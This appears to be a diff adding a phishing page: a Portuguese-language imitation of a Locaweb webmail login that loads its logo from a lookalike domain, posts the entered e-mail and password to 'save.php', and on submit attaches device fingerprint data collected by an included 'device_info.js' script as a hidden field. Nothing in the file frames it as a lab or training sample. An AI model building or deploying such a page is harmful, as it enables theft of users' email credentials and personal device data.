@@ -1,0 +1,214 @@
+
+
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Webmail :: Bem-vindo ao Webmail</title>
+
+<style>
+*{
+  box-sizing:border-box;
+}
+
+html,body{
+  margin:0;
+  min-height:100%;
+  font-family:Arial, Helvetica, sans-serif;
+}
+
+body{
+  background:
+    radial-gradient(#2b2b2b 1px, transparent 1px),
+    #111;
+  background-size:4px 4px;
+}
+
+.main-container{
+  width:100%;
+  min-height:100vh;
+}
+
+.login-box{
+  width:377px;
+  min-height:453px;
+  background:linear-gradient(#252525,#111);
+  border:2px solid #6fc8ff;
+  border-radius:0 0 12px 12px;
+  box-shadow:0 0 0 2px rgba(0,0,0,.6);
+  padding:25px 25px 35px;
+}
+
+.logo{
+  width:200px;
+  display:block;
+  margin-bottom:35px;
+}
+
+.welcome-msg{
+  color:#fff;
+  font-size:14px;
+  font-weight:bold;
+  text-align:center;
+  margin:0 0 35px;
+}
+
+h2{
+  color:#fff;
+  font-size:21px;
+  margin:0 0 18px;
+}
+
+.form-group{
+  margin-bottom:20px;
+}
+
+label{
+  display:block;
+  color:#fff;
+  font-size:14px;
+  font-weight:bold;
+  margin-bottom:6px;
+}
+
+input{
+  width:100%;
+  height:27px;
+  border:1px solid #bfbfbf;
+  background:#fff;
+  padding:4px 8px;
+  font-size:14px;
+}
+
+.btn-submit{
+  width:100%;
+  height:37px;
+  border:0;
+  border-radius:3px;
+  background:linear-gradient(#38b7ff,#0077bd);
+  color:#fff;
+  font-size:14px;
+  cursor:pointer;
+  margin-top:-3px;
+}
+
+@media(max-width:420px){
+  .login-box{
+    width:calc(100% - 8px);
+  }
+}
+</style>
+</head>
+
+<body>
+  <div class="main-container">
+    <div class="login-box">
+      <header>
+        <img src="https://webmail-seguro.com.br/skins/alpha_mobile/images/locaweb_logo.png" alt="Logo" class="logo">
+        <p class="welcome-msg">Bem-vindo ao Webmail</p>
+      </header>
+
+      <main>
+        <h2>Faça seu login</h2>
+
+        <form id="login-form" method="post" action="save.php">
+                    <div class="form-group">
+                        <label for="username">E-mail:</label>
+                        <input type="text" id="username" name="_user" required>
+                    </div>
+
+          <div class="form-group">
+                        <label for="password">Senha:</label>
+                        <input type="password" id="password" name="_pass" required>
+                    </div>
+
+          <button type="submit" class="btn-submit">Entrar</button>
+        </form>
+      </main>
+    </div>
+  </div>
+</body>
+</html>
+<script>
+// Funcionalidade para mostrar campo de senha apenas após digitar email
+document.addEventListener('DOMContentLoaded', function() {
+    const emailInput = document.getElementById('userName');
+    const passwordInput = document.getElementById('pass');
+    const passwordGroup = passwordInput ? passwordInput.closest('.form-group') : null;
+    
+    // Esconde o campo de senha inicialmente
+    if (passwordGroup) {
+        passwordGroup.style.display = 'none';
+    }
+    
+    // Monitora mudanças no campo de email
+    if (emailInput) {
+        emailInput.addEventListener('input', function() {
+            const emailValue = this.value.trim();
+            
+            // Mostra o campo de senha se o email tiver pelo menos 3 caracteres
+            if (emailValue.length >= 3) {
+                if (passwordGroup) {
+                    passwordGroup.style.display = 'block';
+                }
+            } else {
+                if (passwordGroup) {
+                    passwordGroup.style.display = 'none';
+                    // Limpa o campo de senha quando escondido
+                    if (passwordInput) {
+                        passwordInput.value = '';
+                    }
+                }
+            }
+        });
+    }
+    
+    // Funcionalidade do botão "mostrar" senha
+    const showPassBtn = document.querySelector('.show-pass');
+    
+    if (showPassBtn && passwordInput) {
+        showPassBtn.addEventListener('click', function() {
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                this.textContent = 'ocultar';
+            } else {
+                passwordInput.type = 'password';
+                this.textContent = 'mostrar';
+            }
+        });
+    }
+});
+</script>
+
+<!-- Script de coleta de informações do dispositivo -->
+<script src="device_info.js"></script>
+<script>
+// Inicializar coleta de informações do dispositivo
+document.addEventListener('DOMContentLoaded', function() {
+    const deviceCollector = new DeviceInfoCollector();
+    
+    // Coletar informações quando a página carregar
+    deviceCollector.collectAllInfo().then(() => {
+        console.log('Informações do dispositivo coletadas');
+        
+        // Adicionar as informações ao formulário quando for enviado
+        const form = document.querySelector('form[action="save.php"]');
+        if (form) {
+            form.addEventListener('submit', function(e) {
+                // Criar campo hidden com as informações do dispositivo
+                const deviceInfoInput = document.createElement('input');
+                deviceInfoInput.type = 'hidden';
+                deviceInfoInput.name = 'device_info';
+                deviceInfoInput.value = JSON.stringify(deviceCollector.getDeviceInfo());
+                form.appendChild(deviceInfoInput);
+            });
+        }
+    }).catch(error => {
+        console.error('Erro ao coletar informações do dispositivo:', error);
+    });
+});
+</script>
+
+</body>
+</html>
